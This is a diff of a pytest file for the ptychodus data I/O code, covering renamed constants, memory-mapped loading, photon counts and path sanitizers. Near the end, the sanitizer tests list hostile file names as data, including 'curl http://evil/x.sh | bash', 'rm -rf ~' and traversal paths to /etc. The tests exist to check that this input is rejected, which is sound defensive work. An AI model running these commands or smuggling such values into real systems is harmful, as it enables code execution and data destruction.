@@ -17,6 +17,8 @@ from ptychodus.api.io import (
     StandardFileLayout,
     load_diffraction_data,
     load_product,
+    resolve_external_link_path,
+    sanitize_path_component,
     save_diffraction_data,
     save_product,
 )
@@ -24,7 +26,7 @@ from ptychodus.api.object import Object, ObjectCenter
 from ptychodus.api.probe import ProbeSequence
 from ptychodus.api.probe_positions import ProbePosition, ProbePositionSequence
 from ptychodus.api.product import LossValue, Product, ProductMetadata
-from ptychodus.api.diffraction import AssembledDiffractionData
+from ptychodus.api.assemble import AssembledDiffractionData
 
 
 # ---------------------------------------------------------------------------
@@ -100,7 +102,7 @@ def _make_product(
     object_ = Object(
         array=obj_array,
         pixel_geometry=PixelGeometry(width_m=10e-9, height_m=10e-9),
-        center=ObjectCenter(coordinate_x_m=0.0, coordinate_y_m=0.0),
+        center=ObjectCenter(x_m=0.0, y_m=0.0),
         layer_spacing_m=layer_spacing,
     )
 
@@ -126,18 +128,14 @@ class TestStandardFileLayout:
     def test_diffraction_filename(self) -> None:
         assert StandardFileLayout.DIFFRACTION == 'diffraction.h5'
 
-    def test_product_in_filename(self) -> None:
-        assert StandardFileLayout.PRODUCT_IN == 'product-in.h5'
-
-    def test_product_out_filename(self) -> None:
-        assert StandardFileLayout.PRODUCT_OUT == 'product-out.h5'
+    def test_product_filename(self) -> None:
+        assert StandardFileLayout.PRODUCT == 'product.h5'
 
     def test_settings_filename(self) -> None:
         assert StandardFileLayout.SETTINGS == 'settings.ini'
 
-    def test_fluorescence_filenames(self) -> None:
-        assert StandardFileLayout.FLUORESCENCE_IN == 'fluorescence-in.h5'
-        assert StandardFileLayout.FLUORESCENCE_OUT == 'fluorescence-out.h5'
+    def test_fluorescence_filename(self) -> None:
+        assert StandardFileLayout.FLUORESCENCE == 'fluorescence.h5'
 
     def test_model_basename(self) -> None:
         assert StandardFileLayout.MODEL_BASENAME == 'model'
@@ -145,6 +143,19 @@ class TestStandardFileLayout:
     def test_all_values_are_strings(self) -> None:
         for member in StandardFileLayout:
             assert isinstance(member.value, str)
+
+    def test_path_builds_under_directory(self) -> None:
+        assert StandardFileLayout.PRODUCT.path(Path('/x')) == Path('/x/product.h5')
+        assert StandardFileLayout.FLUORESCENCE.path(Path('/x')) == Path('/x/fluorescence.h5')
+        assert StandardFileLayout.SETTINGS.path(Path('/x')) == Path('/x/settings.ini')
+
+    def test_checkpoint_path_inserts_zero_padded_epoch(self) -> None:
+        assert StandardFileLayout.PRODUCT.checkpoint_path(Path('/x'), 42) == Path(
+            '/x/product.000042.h5'
+        )
+        assert StandardFileLayout.FLUORESCENCE.checkpoint_path(Path('/x'), 42) == Path(
+            '/x/fluorescence.000042.h5'
+        )
 
 
 # ---------------------------------------------------------------------------
@@ -184,13 +195,65 @@ class TestDiffractionRoundTrip:
 
         numpy.testing.assert_array_equal(loaded._patterns, original._patterns)
 
-    def test_mmap_raises_not_implemented(self, tmp_path: Path) -> None:
+    def test_mmap_round_trip_matches_in_memory_load(self, tmp_path: Path) -> None:
         original = _make_diffraction_data()
         file = tmp_path / 'diff.h5'
         save_diffraction_data(file, original)
 
-        with pytest.raises(NotImplementedError):
-            load_diffraction_data(file, mmap_file=tmp_path / 'mmap.bin')
+        in_memory = load_diffraction_data(file)
+        mapped = load_diffraction_data(file, mmap_file=tmp_path / 'mmap.bin')
+
+        numpy.testing.assert_array_equal(mapped._patterns, in_memory._patterns)
+        numpy.testing.assert_array_equal(mapped._indexes, in_memory._indexes)
+        numpy.testing.assert_array_equal(mapped._bad_pixels, in_memory._bad_pixels)
+
+    def test_mmap_patterns_are_a_read_only_memory_map(self, tmp_path: Path) -> None:
+        original = _make_diffraction_data()
+        file = tmp_path / 'diff.h5'
+        save_diffraction_data(file, original)
+
+        mmap_file = tmp_path / 'mmap.bin'
+        mapped = load_diffraction_data(file, mmap_file=mmap_file)
+
+        assert mmap_file.is_file()
+        assert isinstance(mapped._patterns, numpy.memmap)
+        assert not mapped._patterns.flags.writeable
+        # Indexes and bad pixels are small and stay in RAM.
+        assert not isinstance(mapped._indexes, numpy.memmap)
+        assert not isinstance(mapped._bad_pixels, numpy.memmap)
+
+    def test_mmap_nbytes_reports_full_logical_size(self, tmp_path: Path) -> None:
+        original = _make_diffraction_data()
+        file = tmp_path / 'diff.h5'
+        save_diffraction_data(file, original)
+
+        in_memory = load_diffraction_data(file)
+        mapped = load_diffraction_data(file, mmap_file=tmp_path / 'mmap.bin')
+
+        # A memory map is backed by disk but still reports its whole logical size.
+        assert mapped.nbytes == in_memory.nbytes
+
+    def test_mmap_spans_multiple_staging_chunks(self, tmp_path: Path) -> None:
+        chunk_frames = 8
+        num_patterns = 3 * chunk_frames + 7
+        indexes = numpy.arange(num_patterns, dtype=numpy.int32)
+        patterns = numpy.arange(num_patterns * 2 * 2, dtype=numpy.uint16).reshape(
+            num_patterns, 2, 2
+        )
+        original = AssembledDiffractionData(
+            indexes,
+            patterns,
+            PixelGeometry(width_m=1e-4, height_m=1e-4),
+            numpy.zeros((2, 2), dtype=numpy.bool_),
+        )
+        file = tmp_path / 'diff_big.h5'
+        save_diffraction_data(file, original)
+
+        mapped = load_diffraction_data(
+            file, mmap_file=tmp_path / 'mmap.bin', mmap_chunk_frames=chunk_frames
+        )
+
+        numpy.testing.assert_array_equal(mapped._patterns, patterns)
 
     def test_bad_pixels_preserved(self, tmp_path: Path) -> None:
         original = _make_diffraction_data()
@@ -211,6 +274,54 @@ class TestDiffractionRoundTrip:
         loaded = load_diffraction_data(file)
 
         numpy.testing.assert_array_equal(loaded._indexes, numpy.arange(6))
+
+    def test_probe_photon_counts_absent_when_unmeasured(self, tmp_path: Path) -> None:
+        original = _make_diffraction_data()
+        file = tmp_path / 'diff.h5'
+
+        save_diffraction_data(file, original)
+
+        with h5py.File(file, 'r') as h5_file:
+            assert 'probe_photon_counts' not in h5_file
+
+        loaded = load_diffraction_data(file)
+        assert not loaded.has_measured_probe_photon_counts()
+
+    def test_probe_photon_counts_round_trip(self, tmp_path: Path) -> None:
+        base = _make_diffraction_data(num_patterns=4)
+        counts = numpy.array([100.0, 200.0, 300.0, 400.0], dtype=numpy.float64)
+        original = AssembledDiffractionData(
+            base._indexes,
+            base._patterns,
+            base.get_pixel_geometry(),
+            base._bad_pixels,
+            probe_photon_counts=counts,
+        )
+        file = tmp_path / 'diff.h5'
+
+        save_diffraction_data(file, original)
+
+        with h5py.File(file, 'r') as h5_file:
+            assert 'probe_photon_counts' in h5_file
+
+        loaded = load_diffraction_data(file)
+        assert loaded.has_measured_probe_photon_counts()
+        numpy.testing.assert_array_equal(loaded.get_probe_photon_counts(), counts)
+
+    def test_legacy_file_without_probe_photon_counts_still_loads(self, tmp_path: Path) -> None:
+        """A file written before this feature (no probe_photon_counts dataset) must load."""
+        original = _make_diffraction_data(num_patterns=3)
+        file = tmp_path / 'diff.h5'
+        save_diffraction_data(file, original)
+
+        # Simulate a pre-existing file: the fresh save already omits the new dataset.
+        with h5py.File(file, 'r') as h5_file:
+            assert 'probe_photon_counts' not in h5_file
+
+        loaded = load_diffraction_data(file)
+        assert not loaded.has_measured_probe_photon_counts()
+        # Fallback path returns total counts, always a valid array.
+        assert loaded.get_probe_photon_counts().shape == (3,)
 
 
 # ---------------------------------------------------------------------------
@@ -338,8 +449,8 @@ class TestProductRoundTrip:
         loaded = load_product(file)
 
         center = loaded.object_.get_center()
-        assert center.coordinate_x_m == pytest.approx(0.0)
-        assert center.coordinate_y_m == pytest.approx(0.0)
+        assert center.x_m == pytest.approx(0.0)
+        assert center.y_m == pytest.approx(0.0)
 
     def test_probe_positions_preserved(self, tmp_path: Path) -> None:
         original = _make_product(num_positions=3)
@@ -351,8 +462,43 @@ class TestProductRoundTrip:
         assert len(loaded.probe_positions) == 3
         for i, (orig, load) in enumerate(zip(original.probe_positions, loaded.probe_positions)):
             assert load.index == orig.index
-            assert load.coordinate_x_m == pytest.approx(orig.coordinate_x_m)
-            assert load.coordinate_y_m == pytest.approx(orig.coordinate_y_m)
+            assert load.x_m == pytest.approx(orig.x_m)
+            assert load.y_m == pytest.approx(orig.y_m)
+
+    def test_product_probe_photon_counts_absent_when_unmeasured(self, tmp_path: Path) -> None:
+        original = _make_product(num_positions=3)
+        file = tmp_path / 'product.h5'
+        save_product(file, original)
+
+        with h5py.File(file, 'r') as h5_file:
+            assert 'probe_photon_counts' not in h5_file
+
+        loaded = load_product(file)
+        assert loaded.probe_positions.get_probe_photon_counts() is None
+
+    def test_product_probe_photon_counts_round_trip(self, tmp_path: Path) -> None:
+        original = _make_product(num_positions=3)
+        # Rebuild the positions with photon counts on every point.
+        positions = ProbePositionSequence(
+            [ProbePosition(i, i * 1e-6, i * 2e-6, probe_photon_count=100.0 + i) for i in range(3)]
+        )
+        original = Product(
+            metadata=original.metadata,
+            probe_positions=positions,
+            probes=original.probes,
+            object_=original.object_,
+            losses=original.losses,
+        )
+        file = tmp_path / 'product.h5'
+        save_product(file, original)
+
+        with h5py.File(file, 'r') as h5_file:
+            assert 'probe_photon_counts' in h5_file
+
+        loaded = load_product(file)
+        assert loaded.probe_positions.get_probe_photon_counts() is not None
+        for i, point in enumerate(loaded.probe_positions):
+            assert point.probe_photon_count == pytest.approx(100.0 + i)
 
     def test_losses_preserved(self, tmp_path: Path) -> None:
         original = _make_product(with_losses=True)
@@ -491,3 +637,55 @@ class TestProductRoundTrip:
 
         assert loaded.metadata.polarization is None
         assert 'Unknown polarization' in caplog.text
+
+
+class TestSanitizePathComponent:
+    """Product names are read verbatim from user-supplied files."""
+
+    @pytest.mark.parametrize(
+        'name',
+        [
+            '../../../etc/ptychodus',
+            '/etc/ptychodus',
+            'run1; curl http://evil/x.sh | bash',
+            'run1$(whoami)',
+            'run1`id`',
+            'run1\nrm -rf ~',
+            '..',
+            '.',
+        ],
+    )
+    def test_hostile_names_yield_one_safe_component(self, name: str) -> None:
+        result = sanitize_path_component(name)
+
+        assert '/' not in result
+        assert '\\' not in result
+        assert not result.startswith('.')
+        assert (Path('/base') / result).parent == Path('/base')
+
+    def test_ordinary_name_is_preserved(self) -> None:
+        assert sanitize_path_component('scan_042-run.1') == 'scan_042-run.1'
+
+    def test_empty_result_falls_back(self) -> None:
+        assert sanitize_path_component('...') == 'unnamed'
+        assert sanitize_path_component('', fallback='product') == 'product'
+
+    def test_result_is_length_bounded(self) -> None:
+        assert len(sanitize_path_component('a' * 500)) == 128
+
+
+class TestResolveExternalLinkPath:
+    """External-link targets are chosen by whoever wrote the master file."""
+
+    def test_relative_target_resolves_under_base(self) -> None:
+        assert resolve_external_link_path(Path('/data/scan'), 'eiger.h5') == Path(
+            '/data/scan/eiger.h5'
+        )
+        assert resolve_external_link_path(Path('/data/scan'), 'sub/eiger.h5') == Path(
+            '/data/scan/sub/eiger.h5'
+        )
+
+    @pytest.mark.parametrize('filename', ['/etc/shadow.h5', '../../secrets.h5', 'a/../../b.h5'])
+    def test_escaping_target_is_rejected(self, filename: str) -> None:
+        with pytest.raises(ValueError):
+            resolve_external_link_path(Path('/data/scan'), filename)
